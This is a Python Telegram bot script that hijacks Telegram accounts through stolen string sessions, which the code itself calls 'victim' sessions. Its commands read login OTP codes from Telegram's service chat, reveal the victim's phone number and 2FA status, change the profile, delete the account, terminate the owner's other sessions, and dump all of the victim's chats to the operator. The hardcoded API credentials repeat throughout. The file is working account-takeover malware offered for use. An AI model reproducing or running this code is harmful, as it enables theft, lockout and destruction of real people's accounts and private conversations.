from telethon.errors import (
  ChatAdminRequiredError,
  FloodWaitError,
  MessageNotModifiedError,
  UserAdminInvalidError,
)
from telethon import events, custom
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl import functions
from telethon.tl.functions.messages import EditChatAdminRequest
from telethon.tl.functions.channels import EditBannedRequest, EditAdminRequest
from telethon.tl.types import (
  ChannelParticipantsAdmins,
  ChannelParticipantsKicked,
  ChatBannedRights,
  UserStatusEmpty,
  ChatAdminRights,
  UserStatusLastMonth,
  UserStatusLastWeek,
  UserStatusOffline,
  UserStatusOnline,
  UserStatusRecently,
)
from telethon.tl.functions.account import GetPasswordRequest as g
from telethon.tl.functions.account import GetAuthorizationsRequest
from telethon.sync import TelegramClient
from telethon.tl.functions.account import UpdateUsernameRequest
from telethon.sessions import StringSession
from telethon import functions, types
import asyncio
import io
import os
from asyncio import sleep
from io import BytesIO
from os import remove
from hackingaibot import BotClient

session = {}

banned_rights = ChatBannedRights(
    until_date=None,
    view_messages=True
)

##############################################################################################################################



########################################## Fetching session from the user #########################################################



##############################################################################################################################



@BotClient.on(events.NewMessage(pattern="^/string(?: |$)(.*)"))
async def _(event):
  try:
    strg = str(event.text[8:])
    session[event.sender_id] = strg
    string = session[event.sender_id]
    mat = "https://t.me/Gladiators_Projects"
    async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
      try:
        await victim(functions.channels.JoinChannelRequest(channel=mat))
      except:
        pass
    await event.reply("**String saved Successfully!!**")
  except Exception as e:
    print(e)
    xd = event.sender_id
    if xd in session:
      del session[xd]
    await event.reply("**OOPS!! Something went wrong!!**\n\n**I guess this string was terminated!!**\n\n**Try again:**\n\nSyntax:-\n/string <String Session>")

##############################################################################################################################



################################################# LOGIN GEAR #################################################################



##############################################################################################################################




@BotClient.on(events.NewMessage(incoming=True, pattern="^/phone(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        xd = await victim.get_me()
        numb = "+" + str(xd.phone)
        await event.reply(numb)
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)



@BotClient.on(events.NewMessage(incoming=True, pattern="^/pass(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        result = (await victim(g())).has_password
        if result is True:
          await event.reply("Yes, There's 2FA Password!!")
        else:
          await event.reply("There isn't any 2FA password!!")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/otp(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        async for msg in victim.iter_messages(777000):
          if msg:
            await event.reply(msg)
            break
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


##############################################################################################################################



################################################ ACCOUNT GEAR ################################################################



##############################################################################################################################




@BotClient.on(events.NewMessage(incoming=True, pattern="^/first(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[7:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        await victim(functions.account.UpdateProfileRequest(
          first_name = mat
        ))
      await event.reply("**Changed first name successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/profilepic(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      glad = await event.get_reply_message()
      media = await glad.download_media( "hackingaibot/downloads/")
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        await victim(UploadProfilePhotoRequest(
          await victim.upload_file(media)
        ))
      await event.reply("**Changed profile picture successfully!!**")
      os.remove(media)
    except Exception as e:
      await event.reply(f"**Reply to any media i.e photo/video bruh!**")


@BotClient.on(events.NewMessage(incoming=True, pattern="^/last(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[6:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        await victim(functions.account.UpdateProfileRequest(
          last_name = mat
        ))
      await event.reply("**Changed last name successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/username(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[10:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        await victim(UpdateUsernameRequest(mat))
      await event.reply("**Changed username successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/about(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[7:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        await victim(functions.account.UpdateProfileRequest(
          about = mat
        ))
      await event.reply("**Changed about successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/delete(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[8:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        await victim(functions.account.DeleteAccountRequest(
          reason = mat
        ))
      await event.reply("**Deleted account successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)



@BotClient.on(events.NewMessage(incoming=True, pattern="^/details(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        xd = await victim.get_me()
        await event.reply(str(xd))
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/terminate(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        x = []
        result = await victim(GetAuthorizationsRequest())
        for m in result.authorizations:
          x.append(m.hash)
        for i in x:
          if str(i) != "0":
            h = int(i)
            await victim(functions.account.ResetAuthorizationRequest(hash=h))
      await event.reply("**Terminated all sessions successfully!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)




@BotClient.on(events.NewMessage(incoming=True, pattern="^/whole(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    message_id = event.message.id
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
        dialogs = await victim.get_dialogs()
        gldtr = str(dialogs)
        l = await victim.get_me()
        name = str(l.first_name)
        with io.BytesIO(str.encode(gldtr)) as out_file:
          out_file.name = "Data.txt"
          await event.client.send_file(
            event.chat_id,
            out_file,
            force_document=True,
            thumb="hackingaibot/resources/Gladiators.jpeg",
            allow_cache = False,
            caption=f"Here's the whole data of {name}\n\n© @Gladiators_Projects",
            reply_to=message_id,
          )
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
